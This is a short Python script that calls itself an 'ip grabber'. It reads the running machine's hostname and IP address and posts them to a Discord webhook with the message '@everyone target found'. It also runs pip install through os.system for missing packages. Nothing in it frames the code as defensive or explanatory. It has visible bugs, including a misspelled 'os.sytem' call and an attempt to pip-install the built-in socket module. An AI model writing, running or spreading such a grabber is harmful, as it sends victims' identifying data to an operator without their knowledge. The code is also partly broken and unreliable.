webhook = "webhook here"

import os
try:
   import socket
except ModuleNotFoundError:
    os.system("pip install socket") 
try:
    import discordwebhook
except ModuleNotFoundError:
    os.sytem("pip install discordwebhook.py")
try:
    import aiohttp

except ModuleNotFoundError:
    os.system("pip install aiohttp")
hostname=socket.gethostname()   
ip_address=socket.gethostbyname(hostname)    
webhook = discordwebhook.Webhook(
    url=webhook
)
embed = discordwebhook.Embed(
    title="ip grabber by unknown",
)
embed.add_field(name="Ip:", value=ip_address, inline=False)
embed.add_field(name="hostname:", value=hostname, inline=False)
webhook.send_sync(
    f"@everyone target found", 
    username="unknow.ipgrabber",
    embed=embed
)